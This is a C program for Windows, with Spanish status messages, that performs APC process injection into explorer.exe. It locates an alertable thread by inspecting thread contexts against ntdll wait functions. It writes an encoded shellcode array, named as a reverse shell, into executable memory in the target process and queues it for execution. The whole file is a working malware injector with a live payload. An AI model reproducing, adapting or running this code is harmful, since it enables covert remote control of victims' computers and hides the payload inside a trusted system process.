#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

BOOL IsAlertable(HANDLE hp, HANDLE ht, LPVOID addr[6]) {
    CONTEXT   c;
    BOOL      alertable = FALSE;
    DWORD     i;
    ULONG_PTR p[8];
    SIZE_T    rd;
    
    // read the context
    c.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
    GetThreadContext(ht, &c);
    
    // for each alertable function
    for(i=0; i<6 && !alertable; i++) {
      // compare address with program counter
      if((LPVOID)c.Rip == addr[i]) {
        switch(i) {
          // ZwDelayExecution
          case 0 : {
            alertable = (c.Rcx & TRUE);
            break;
          }
          // NtWaitForSingleObject
          case 1 : {
            alertable = (c.Rdx & TRUE);
            break;
          }
          // NtWaitForMultipleObjects
          case 2 : {
            alertable = (c.Rsi & TRUE);
            break;
          }
          // NtSignalAndWaitForSingleObject
          case 3 : {
            alertable = (c.Rsi & TRUE);
            break;
          }
          // NtUserMsgWaitForMultipleObjectsEx
          case 4 : {
            ReadProcessMemory(hp, (LPVOID)c.Rsp, p, sizeof(p), &rd);
            alertable = (p[5] & MWMO_ALERTABLE);
            break;
          }
          // NtRemoveIoCompletionEx
          case 5 : {
            ReadProcessMemory(hp, (LPVOID)c.Rsp, p, sizeof(p), &rd);
            alertable = (p[6] & TRUE);
            break;
          }            
        }
      }
    }
    return alertable;
}


int main(int argc, char* argv[]) {

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    int PID = 0;
    HANDLE p;
    HANDLE hilo;
    LPVOID memoria;

    LPVOID f[6];
    HMODULE m;
    DWORD i;
    char *api[6]={
        "ZwDelayExecution", 
        "ZwWaitForSingleObject",
        "NtWaitForMultipleObjects",
        "NtSignalAndWaitForSingleObject",
        "NtUserMsgWaitForMultipleObjectsEx",
        "NtRemoveIoCompletionEx"};
    
    for(i=0; i<6; i++) {
        m = GetModuleHandleA(i == 4 ? "win32u" : "ntdll");
        f[i] = (LPBYTE)GetProcAddress(m, api[i]) + 0x14;
    }

    unsigned char reversashell[] = "\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x65\x90\x1e\xa4\x88\xba\x9b\x68\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x99\xd8\x9d\x40\x78\x52"
"\x57\x68\x65\x90\x5f\xf5\xc9\xea\xc9\x20\x54\x42\x4f\xc1\xc0"
"\x31\xc9\x08\x2d\x1b\x4c\xbc\xde\xf2\x10\x3a\x45\xdd\x2f\x6d"
"\xc0\xb5\x2c\x22\x2f\xd8\x95\xd6\xd8\xf2\xaa\xa8\xc9\xac\x7f"
"\xd8\x8a\x96\xbb\x29\xa4\x59\x13\xe5\x89\x7b\x79\x85\x37\xd8"
"\x95\xf6\xa8\xfb\xca\xe3\x27\xac\x56\xa5\x58\xdc\x1a\x10\x7d"
"\x9b\x1c\xab\x0d\xc8\x9b\x68\x65\x1b\x9e\x2c\x88\xba\x9b\x20"
"\xe0\x50\x6a\xc3\xc0\xbb\x4b\x38\x21\x1b\x5e\x84\x03\xf2\x83"
"\x21\x64\x40\xfd\xf2\xc0\x45\x52\x29\xee\xa4\x96\xe9\xb9\x73"
"\xd3\x69\xb3\xd8\x2f\x64\xc9\x7b\x52\x65\xc9\xd1\x1f\x65\xb0"
"\x5a\xee\x99\x29\x93\x52\x80\x80\xff\xa2\xb9\x10\x48\x46\xe0"
"\x03\xfa\xbf\x21\x64\x40\x78\xe5\x03\xb6\xd3\x2c\xee\xd0\x02"
"\xed\x89\x6a\xda\xe3\x61\x18\x56\xa5\x58\xfb\xc3\x29\x3d\xce"
"\x47\xfe\xc9\xe2\xda\x31\x24\xca\x56\x27\x64\x9a\xda\x3a\x9a"
"\x70\x46\xe5\xd1\xe0\xd3\xe3\x77\x79\x55\x5b\x77\x45\xc6\x21"
"\xdb\xe7\x6d\x96\xd7\x89\xa9\x68\x65\xd1\x48\xed\x01\x5c\xd3"
"\xe9\x89\x30\x1f\xa4\x88\xf3\x12\x8d\x2c\x2c\x1c\xa4\x89\x01"
"\x5b\xc0\xf6\x1b\x5f\xf0\xc1\x33\x7f\x24\xec\x61\x5f\x1e\xc4"
"\xcd\xbd\x6f\x9a\x45\x52\x2d\x62\xd2\x9a\x69\x65\x90\x47\xe5"
"\x32\x93\x1b\x03\x65\x6f\xcb\xce\x82\xfb\xc5\x38\x35\xdd\x2f"
"\x6d\xc5\x8b\x5b\x20\x9a\x50\x56\x2d\x4a\xf2\x64\xa8\x2d\x19"
"\xdf\xe5\x32\x50\x94\xb7\x85\x6f\xcb\xec\x01\x7d\xf1\x78\x24"
"\xc8\x52\x2d\x6a\xf2\x12\x91\x24\x2a\x87\x01\xfc\xdb\x64\xbd"
"\xe0\x50\x6a\xae\xc1\x45\x55\x1d\x80\x78\x8d\xa4\x88\xba\xd3"
"\xeb\x89\x80\x56\x2d\x6a\xf7\xaa\xa1\x0f\x94\x5f\xfc\xc0\x33"
"\x62\x29\xdf\x92\xc7\x6c\xd7\x45\x4e\xeb\x9d\x90\x60\xf1\xc0"
"\x39\x5f\x48\x3b\x19\xe8\xce\xc8\xfb\xc2\x00\x65\x80\x1e\xa4"
"\xc9\xe2\xd3\xe1\x97\xd8\x2f\x6d\xc9\x00\xc3\xcc\x36\x75\xe1"
"\x71\xc0\x33\x58\x21\xec\x57\x53\x95\x41\xf3\x12\x98\x2d\x19"
"\xc4\xec\x01\x43\xda\xd2\x67\x49\xd6\xfb\x77\x6f\x18\x90\x65"
"\xed\x36\xfc\xc9\xed\xc2\x00\x65\xd0\x1e\xa4\xc9\xe2\xf1\x68"
"\x3f\xd1\xa4\xaf\xa7\xb5\xab\x97\xb0\xc7\x47\xe5\x32\xcf\xf5"
"\x25\x04\x6f\xcb\xed\x77\x74\x72\x54\x9a\x6f\xe1\xec\x89\x79"
"\xd3\x41\xa3\xd8\x9b\x52\xfd\x0e\xda\x97\x82\xc8\x74\xa4\xd1"
"\xf3\x5c\xaa\x95\x25\xbc\xf2\x77\x6f\x9b\x68";


    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("\n[!] Error: no se ha podido obtener un snapshot de los procesos");
        return 1;
    }

    PROCESSENTRY32 procesos = { sizeof(PROCESSENTRY32) };
    THREADENTRY32 hilos = { sizeof(THREADENTRY32) };

    Process32First(snapshot, &procesos);

    do {
        if (!strcmp(procesos.szExeFile, "explorer.exe")) {
            PID = procesos.th32ProcessID;
            break;
        }
    } while (Process32Next(snapshot,&procesos));

    printf("\n[+] PID del proceso explorer encontrado: %d", PID);

    p = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, PID);

    if (p == NULL) {
        printf("\n[!] Error: no se pude controlar el proceso");
        return 1;
    }

    printf("\n[+] Proceso controlado en %p", p);

    memoria = VirtualAllocEx(p, NULL, sizeof(reversashell), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (memoria == NULL) {
        printf("\n[!] Error: no se pude reservar memoria en el proceso");
        return 1;
    }

    printf("\n[+] Memoria reservada en %p", memoria);

    if (!WriteProcessMemory(p, memoria, reversashell, sizeof(reversashell), NULL)) {
        printf("\n[!] Error: no se pude escribir en la memoria del proceso");
        return 1;
    }

    printf("\n[+] La shellcode se ha escrito correctamente");


    Thread32First(snapshot, &hilos);

    ULONG_PTR queue;

    do {

        if ((int)hilos.th32OwnerProcessID == PID) {
            hilo = OpenThread(THREAD_ALL_ACCESS, FALSE, hilos.th32ThreadID);

            if (hilo != NULL) {
                if (IsAlertable(p, hilo, f)) {
                    printf("\n[+] Hilo en estado Alertable encontrado...");
                    if (QueueUserAPC((PAPCFUNC)memoria, hilo, queue) != 0) {
                        printf("\n[+] Shellcode ejecutada con exito");
                        Sleep(1000 * 2);
                        break;
                    }
                    else {
                        printf("\n[!] Error: no se pude agregar el procedimiento a la cola del hilo con ID %d", hilos.th32ThreadID);
                    }
                }
            }
            else {
                printf("\n[!] Error: no se pude controlar el hilo con ID %d", hilos.th32ThreadID);
            }

        }        

    }while(Thread32Next(snapshot, &hilos));

    return 0;
}